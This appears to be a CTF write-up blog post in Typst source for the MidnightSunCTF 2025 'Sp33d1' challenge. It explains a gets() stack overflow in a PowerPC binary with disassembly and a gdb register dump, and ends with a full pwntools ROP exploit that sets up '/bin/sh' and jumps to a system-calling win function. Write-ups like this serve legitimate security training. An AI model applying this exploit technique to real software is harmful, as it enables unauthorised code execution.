#import "./html_elements.typ": post

#show: post

// +++
// title = 'MidnightSunCTF 2025 - Sp33d1'
// date = 2025-05-18T18:00:02-03:00
// tags = ['pwn', 'ctf']
// draft = false
// +++

= Sp33d1

This was a speedpwn challenge. I unfortunately wasn't able to play the CTF, it
only lasted 24h and I was busy the whole saturday, some kind of shabbos you can say.


This is a powerpc ROP challenge. Below is the disassembly of the `main`
function. The vulnerability is that we have a `gets` that stores a string of
any length in a stack variable, giving us a stack buffer overflow.



```asm
; > PowerPC ELF32 2's complement, big endian
; RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
; Full RELRO      No canary found   NX enabled    No PIE          N/A        N/A          2043 Symbols      N/A   0               0               sp33d1

stwu r1, -0x20(r1)
mflr r0
stw r0, 0x24(r1)
stw r31, 0x1c(r1)
mr r31, r1
lis r9, 0x100c
lwz r9, 0x1210(r9)          ; 0x100c0278
                            ; obj._IO_2_1_stdin_
li r6, 0                    ; size_t size
li r5, 2                    ; int mode
li r4, 0                    ; char *buf
mr r3, r9                   ; FILE*stream
bl sym.setvbuf              ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
lis r9, 0x100c
lwz r9, 0x120c(r9)          ; 0x100c0148
                            ; obj._IO_2_1_stdout_
li r6, 0                    ; size_t size
li r5, 2                    ; int mode
li r4, 0                    ; char *buf
mr r3, r9                   ; FILE*stream
bl sym.setvbuf              ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
li r3, 0x3c
bl sym.alarm
bl sym.banner
lis r9, 0x1007
addi r3, r9, 0x6f70         ; int32_t arg1
crclr cr1eq
bl sym.__printf
addi r9, r31, 8
mr r3, r9                   ; char *s
crclr cr1eq
bl sym.gets                 ; char *gets(char *s)
li r9, 0
mr r3, r9
addi r11, r31, 0x20
lwz r0, 4(r11)
mtlr r0
lwz r31, -4(r11)
mr r1, r11
blr
```


Note that at the function's epilogue we have:

- `lwz r0, 4(r11)`  > load `r11[4]` to `r0`
- `mtlr r0` > move `r0` to link register
- `blr` > branch to link register

In gdb those are the registers right at the function's epilogue. By
sending an input with `cyclic(0x100)` we can see that we control:

- R0
- R1
- R11
- R31
- LR

```asm
 R0   0x68616161 ('haaa')
*R1   0x407ff8d0 ◂— 0x67616161 ('gaaa')
 R2   0x100cc580 ◂— 0
 R3   0
 R4   0x100c02bf (_IO_2_1_stdin_+71) ◂— 0xa100c1c
 R5   1
 R6   0xa
 R7   0x100c02c0 (_IO_2_1_stdin_+72) —▸ 0x100c1c08 (_IO_stdfile_0_lock) ◂— 0
 R8   0x100c0278 (_IO_2_1_stdin_) ◂— 0xfbad208b
 R9   0
 R10  1
 R11  0x407ff8d0 ◂— 0x67616161 ('gaaa')
 R12  0x40000222 ◂— 0
 R13  0x100c91f8 ◂— 0
 R14  0
 R15  0
 R16  0
 R17  0
 R18  0
 R19  0
 R20  0
 R21  0x100c0000 —▸ 0x100c91f8 ◂— 0
 R22  0x10000634 (main) ◂— stwu r1, -0x20(r1)
 R23  0x100c12c8 (environ) —▸ 0x407ffb4c —▸ 0x407ffd09 ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus'
 R24  0x10000138 (_init) ◂— stwu r1, -0x10(r1)
 R25  0x100bcdb4 —▸ 0x100c0d14 (_nl_global_locale+16) —▸ 0x100bd8b4 (_nl_C_LC_MONETARY) —▸ 0x100c1268 (_nl_C_name) ◂— 0x43000000 /* 'C' */
 R26  0x407ffb4c —▸ 0x407ffd09 ◂— 'DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus'
 R27  0x407ffc2c ◂— 0x16
 R28  0x407ffb44 —▸ 0x407ffd00 ◂— './sp33d1'
 R29  1
 R30  0x100bfff0 (_GLOBAL_OFFSET_TABLE_) ◂— 0
 R31  0x66616161 ('faaa')
 CR   0x20000222
 CTR  0x10014b00 (_IO_file_read) ◂— stwu r1, -0x10(r1)
*SP   0x407ff8d0 ◂— 0x67616161 ('gaaa')
 LR   0x68616161 ('haaa')
*PC   0x100006c8 (main+148) ◂— blr
```

Given that, we control the execution flow and can start ROP'ing.

There a a few things that make our life easier:

- there's no PIE.
- the ELF is statically linked.
- we have the `/bin/sh` string at `0x10077a8c`
- we have the `win` function at `0x100005f8` which calls system


The only thing we need to do is to setup the `/bin/sh` as the first argument,
and then go to `win`.

I tried using `ROPGadget` but it didn't work with the ppc ELF, even though it's
supported, instead of trying to fix it, I just tried with `ropper` and it
worked.

Most gadgets found by the tool look like this:

- 0x100716e4: add r1, r1, r10; blr;

This is different that I'm used to do when ROP'ing, since x64 the `ret`
instruction can be used to chain our ROP. Below is the full solution:


```python

from pwn import *

context(arch='PowerPC', bits=32, endian='big')

#io = remote('sp33d.play.hfsc.tf', 20020)
#io = gdb.debug('./sp33d1', 'b main')
io = process('./sp33d1')

set_r3 = 0x100712b4 # lwz r3, 0x10(r1); lwz r0, 0x24(r1); lwz r30, 0x18(r1); addi r1, r1, 0x20; mtlr r0; blr;

win = 0x100005f8
bin_sh = 0x10077a8c

io.sendline(flat([
    b'a' * 0x1c,
    p32(set_r3 + 2),
    p32(win + 2),
    b'b' * 4,
    p32(bin_sh),
    b'c' * 0x10,
    p32(win),
]))

io.interactive()
```
